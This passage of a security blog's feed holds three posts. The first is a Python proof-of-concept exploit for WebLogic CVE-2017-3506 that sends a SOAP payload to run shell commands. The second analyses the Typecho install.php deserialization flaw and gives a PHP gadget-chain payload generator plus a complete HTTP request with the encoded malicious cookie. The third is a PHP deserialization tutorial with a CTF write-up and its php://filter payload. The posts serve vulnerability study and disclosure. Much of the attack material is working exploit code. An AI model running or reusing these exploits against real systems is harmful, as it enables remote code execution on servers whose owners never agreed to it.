class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">heads = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'text/xml;charset=UTF-8'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">"http"</span>):</span><br><span class="line">        url = <span class="string">"http://"</span> + url</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"/"</span> <span class="keyword">in</span> url:</span><br><span class="line">        url += <span class="string">'/wls-wsat/CoordinatorPortType'</span></span><br><span class="line">    post_str = <span class="string">'''</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">        &lt;work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"&gt;</span></span><br><span class="line"><span class="string">          &lt;java&gt;</span></span><br><span class="line"><span class="string">            &lt;object class="java.lang.ProcessBuilder"&gt;</span></span><br><span class="line"><span class="string">              &lt;array class="java.lang.String" length="3"&gt;</span></span><br><span class="line"><span class="string">                &lt;void index="0"&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">                &lt;void index="1"&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">&lt;void index="2"&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;whoami&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">              &lt;/array&gt;</span></span><br><span class="line"><span class="string">              &lt;void method="start"/&gt;</span></span><br><span class="line"><span class="string">            &lt;/object&gt;</span></span><br><span class="line"><span class="string">          &lt;/java&gt;</span></span><br><span class="line"><span class="string">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=post_str, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, headers=heads)</span><br><span class="line">        response = response.text</span><br><span class="line">        response = re.search(<span class="string">r"\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;"</span>, response).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        response = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'&lt;faultstring&gt;java.lang.ProcessBuilder'</span> <span class="keyword">in</span> response <span class="keyword">or</span> <span class="string">"&lt;faultstring&gt;0"</span> <span class="keyword">in</span> response:</span><br><span class="line">        result = <span class="string">"test ok"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="string">"No Vulnerability"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(argv) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"python weblogic_poc.py url:port"</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = argv[<span class="number">1</span>]</span><br><span class="line">    result = poc(url=url)</span><br><span class="line">    <span class="keyword">print</span> result</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞编号&quot;&gt;&lt;a href=&quot;#漏洞编号&quot; class=&quot;headerlink&quot; title=&quot;漏洞编号&quot;&gt;&lt;/a&gt;漏洞编号&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;CVE-2017-3506 （wls-wsat 远程命令执行漏洞）&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Poc" scheme="https://dayu.ink/categories/Poc/"/>
    
    
      <category term="Poc" scheme="https://dayu.ink/tags/Poc/"/>
    
  </entry>
  
  <entry>
    <title>Typecho 反序列化 任意代码执行 漏洞分析</title>
    <link href="https://dayu.ink/typecho-unserialize.html"/>
    <id>https://dayu.ink/typecho-unserialize.html</id>
    <published>2017-10-26T12:13:43.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h2><ul><li>程序安装后不会自动删除install.php，install.php中存在反序列化漏洞引发（网传是开发者故意留的后门）</li><li>Typecho官方已于2017-10-24 更新v1.1-17.10.24-beta版 已修复此漏洞。</li><li>测试版本：v1.1-15.5.12-beta</li></ul><a id="more"></a><ul><li>源码github地址：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/typecho/typecho/releases</span><br></pre></td></tr></table></figure></li></ul><h2 id="install-php-反序列部分"><a href="#install-php-反序列部分" class="headerlink" title="install.php 反序列部分"></a>install.php 反序列部分</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">228</span>                <span class="meta">&lt;?php</span> <span class="keyword">else</span> : <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">229</span>                    <span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">230</span>                    $config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line"><span class="number">231</span>                    Typecho_Cookie::delete(<span class="string">'__typecho_config'</span>);</span><br><span class="line"><span class="number">232</span>                    $db = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line"><span class="number">233</span>                    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br><span class="line"><span class="number">234</span>                    Typecho_Db::set($db);</span><br><span class="line"><span class="number">235</span>                    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>install.php</code> 的230行，会读取cookie中的<code>__typecho_config</code> ，并将其base64解码反序列后赋给<code>config</code>变量</li><li>231行会删除cookie中的<code>__typecho_config</code>，这一步无关紧要。</li><li>232行会实例化<code>Typecho_Db</code>，并且传值<code>$config</code>中的<code>adapter</code>和<code>prefix</code>。</li><li><p>233行会调用<code>addServer</code>方法<br><code>Typecho_Cookie::get</code>的定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = <span class="keyword">self</span>::$_prefix . $key;</span><br><span class="line">    $value = <span class="keyword">isset</span>($_COOKIE[$key]) ? $_COOKIE[$key] : (<span class="keyword">isset</span>($_POST[$key]) ? $_POST[$key] : $default);</span><br><span class="line">    <span class="keyword">return</span> is_array($value) ? $default : $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  修改cookie和post内容都可以赋值。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">由于</span><br><span class="line"><span class="number">213</span>行            <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'finish'</span>])) : <span class="meta">?&gt;</span></span><br><span class="line"><span class="number">221</span>行                <span class="meta">&lt;?php</span> <span class="keyword">elseif</span> (!Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)): <span class="meta">?&gt;</span></span><br><span class="line">首先fisish，__typecho_config要有赋值，才能进行反序列化。</span><br></pre></td></tr></table></figure><h2 id="继续跟进"><a href="#继续跟进" class="headerlink" title="继续跟进"></a>继续跟进</h2><p>我们先到<code>Typecho_Db</code>的构造函数看看他继续做了什么<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/** 获取适配器名称 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 数据库适配器 */</span></span><br><span class="line">    $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;   <span class="comment">//第一个参数在这里进行了拼接，如果传入的是实例化对象，会调用该对象__toString()魔术方法。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_prefix = $prefix;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** 初始化内部变量 */</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_pool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_connectedPool = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;_config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化适配器对象</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li>我们找一些含有<code>__toString</code>的类，找到了<code>Typecho_Feed</code>。</li><li><p>他在290行，执行了这样一段代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content .= <span class="string">'&lt;dc:creator&gt;'</span> . htmlspecialchars($item[<span class="string">'author'</span>]-&gt;screenName) . <span class="string">'&lt;/dc:creator&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br></pre></td></tr></table></figure></li><li><p>由于我们注入的是对象，<code>$item</code>是能够控制的。我们进而就可以调用<code>__get</code>这个魔术方法，继续寻找含有<code>__get</code>的类，我们找到了<code>class Typecho_Request</code>，他的<code>__get()</code>魔术方法会调用他自己的<code>get()</code>方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">            $value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $value = $default;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><code>get()</code>方法会给<code>$value</code>赋值，然后调用自己的<code>_applyFilter</code>方法。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">            $value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">            call_user_func($filter, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>array_map</code>和<code>call_user_func</code> 中的<code>($filter, $value)</code>都是可控的，可以给<code>$filter</code>赋值<code>assert</code>两处都可进行命令执行。</p><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>payload构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addItem</span><span class="params">(array $item)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items[] = $item;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params[<span class="string">'screenName'</span>] = file_put_contents(<span class="string">'dayuinfo.php'</span>, <span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">'assert'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$payload1 = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line">$payload2 = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line">$payload1-&gt;addItem(<span class="keyword">array</span>(<span class="string">'author'</span> =&gt; $payload2));</span><br><span class="line">$exp = <span class="keyword">array</span>(<span class="string">'adapter'</span> =&gt; $payload1, <span class="string">'prefix'</span> =&gt; <span class="string">''</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br></pre></td></tr></table></figure></p><p>写入文件测试成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /install.php?finish=1 HTTP/1.1</span><br><span class="line">Host: 127.0.0.2</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: __typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo2OiJBVE9NIDEiO3M6NjoiX2l0ZW1zIjthOjE6e2k6MDthOjE6e3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX3BhcmFtcyI7YToxOntzOjEwOiJzY3JlZW5OYW1lIjtpOjE4O31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjA6IiI7fQ==</span><br><span class="line">Referer:http://127.0.0.2/install.php</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;漏洞起因&quot;&gt;&lt;a href=&quot;#漏洞起因&quot; class=&quot;headerlink&quot; title=&quot;漏洞起因&quot;&gt;&lt;/a&gt;漏洞起因&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;程序安装后不会自动删除install.php，install.php中存在反序列化漏洞引发（网传是开发者故意留的后门）&lt;/li&gt;
&lt;li&gt;Typecho官方已于2017-10-24 更新v1.1-17.10.24-beta版 已修复此漏洞。&lt;/li&gt;
&lt;li&gt;测试版本：v1.1-15.5.12-beta&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="Web" scheme="https://dayu.ink/categories/Web/"/>
    
    
      <category term="Web" scheme="https://dayu.ink/tags/Web/"/>
    
      <category term="PHP" scheme="https://dayu.ink/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化初探笔记</title>
    <link href="https://dayu.ink/PHP-unserialize.html"/>
    <id>https://dayu.ink/PHP-unserialize.html</id>
    <published>2017-10-25T12:30:58.000Z</published>
    <updated>2019-04-26T07:10:26.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><ul><li><p>序列化就是使用<code>serialize()</code>将对象的用字符串的方式进行表示，反序列化是使用<code>unserialize()</code>将序列化的字符串，构造成相应的对象，反序列化是序列化的逆过程。</p></li><li><p>序列化的对象可以是<code>class</code>也可以是<code>Array,string</code>等其他对象。</p></li></ul><a id="more"></a><h2 id="反序列化存在的问题"><a href="#反序列化存在的问题" class="headerlink" title="反序列化存在的问题"></a>反序列化存在的问题</h2><ul><li><p>问题原因：漏洞的根源在于<code>unserialize()</code>函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码或变量用户可控，就可能产生反序列化漏洞，根据反序列化后不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。</p></li><li><p>魔术方法：PHP的类中可能会包含一些特殊的函数叫魔术函数，魔术函数命名是以符号 __开头的</p></li></ul><ul><li>反序列化漏洞中常见到有一些魔术方法：<br><code>__construct()</code>：在对象创建时自动被调用<br><code>__destruct()</code>：对象被销毁时触发<br><code>__sleep()</code>：使用serialize时触发<br><code>__wakeup()</code>：使用unserialize时触发<br><code>__toString()</code>： 把类当作字符串调用时触发<br><code>__call()</code>：在对象上下文中调用不可访问的方法时触发<br><code>__callStatic()</code>：在静态上下文中调用不可访问的方法时触发<br><code>__get()</code>：用于从不可访问的属性读取数据，或访问类中不存在的方法时触发<br><code>__set()</code>：用于将数据写入不可访问的属性<br><code>__isset()</code>：在不可访问的属性上调用isset()或empty()触发<br><code>__unset()</code>：在不可访问的属性上使用unset()时触发<br><code>__invoke()</code>：当脚本尝试将对象调用为函数时触发</li></ul><h2 id="2016xctf的一道反序列化题目"><a href="#2016xctf的一道反序列化题目" class="headerlink" title="2016xctf的一道反序列化题目"></a>2016xctf的一道反序列化题目</h2><p>index.php的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$user = $_GET[<span class="string">"user"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"pass"</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;  </span><br><span class="line"></span><br><span class="line">       <span class="keyword">exit</span>();  </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"></span><br><span class="line">      <span class="keyword">include</span>($file); <span class="comment">//class.php  </span></span><br><span class="line"></span><br><span class="line">        $pass = unserialize($pass);  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> ($pass);  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>class.php的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php  </span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> $file;  </span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line"></span><br><span class="line">         <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);      </span><br><span class="line"></span><br><span class="line">      &#125;  </span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>源码分析： </p><ul><li><p>index.php源码 中的第6行使用<code>file_get_contents</code>读取user参数的值，这里必须要用<code>php://input</code> 赋值the user is admin，并不可以利用。<br>第9行限制我们在给file传值时不能含有<code>f1a9</code>，我没有做过原题，可以猜出出题人不想让我们直接读取f1a9xxx的文件，flag应该就在其中。<br>然后在源码的第15行存在<code>include($file)</code>文件包含，第17行<code>unserialize($pass)</code>反序列化函数的参数可控，在第13行执行了<code>echo $pass;</code> </p></li><li><p>class.php源码 中使用了<code>__toString()</code>魔术方法，<code>echo $pass;</code> 会触发__toString()魔术方法，所以存在反序列化漏洞，其中第11行file_get_contents是用来读取$file变量的文件的，并且给出了提示，//f1a9.php； </p></li><li><p>所以本题的考点就是利用文件包含使用php://input的封装协议传入user参数的值，满足index.php源码中的第6行的条件，在pass参数中传入序列化后要读取的flag文件。</p></li></ul><h3 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> $file;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$payload = <span class="keyword">new</span> Read();</span><br><span class="line">$payload -&gt; file = <span class="string">'php://filter/read=convert.base64-encode/resource=f1a9.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($payload);</span><br></pre></td></tr></table></figure><p>输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>最终请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET DATA ：?user=php://input&amp;file=class.php&amp;pass=O:4:&quot;Read&quot;:1:&#123;s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;&#125; </span><br><span class="line"></span><br><span class="line">POST DATA：the user is admin</span><br></pre></td></tr></table></figure></p><p>进行上面的请求，然后得到经过base64编码过的f1a9.php源码，得到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;序列化和反序列化&quot;&gt;&lt;a href=&quot;#序列化和反序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化和反序列化&quot;&gt;&lt;/a&gt;序列化和反序列化&lt;/h2&gt;&lt;ul&gt;
